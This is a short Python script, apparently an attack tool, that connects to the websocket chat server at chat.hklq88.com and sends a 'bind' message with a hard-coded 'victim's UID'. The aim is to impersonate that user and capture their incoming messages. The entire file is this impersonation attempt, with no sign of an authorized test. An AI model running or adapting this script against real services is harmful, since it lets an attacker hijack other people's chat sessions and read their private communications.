import asyncio
import websockets
import json

async def impersonate_ws():
    uri = "wss://chat.hklq88.com/"
    print(f"[*] DUDE: Connecting to {uri}...")
    try:
        async with websockets.connect(uri) as websocket:
            print("[+] Connected.")
            # Try to bind with the victim's UID
            bind_msg = {"type": "bind", "uid": "7574297133429703688"}
            await websocket.send(json.dumps(bind_msg))
            print(f"[>] Sent: {bind_msg}")
            
            # Wait for responses
            while True:
                try:
                    response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                    print(f"[<] Received: {response}")
                except asyncio.TimeoutError:
                    print("[!] Timeout.")
                    break
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    asyncio.run(impersonate_ws())
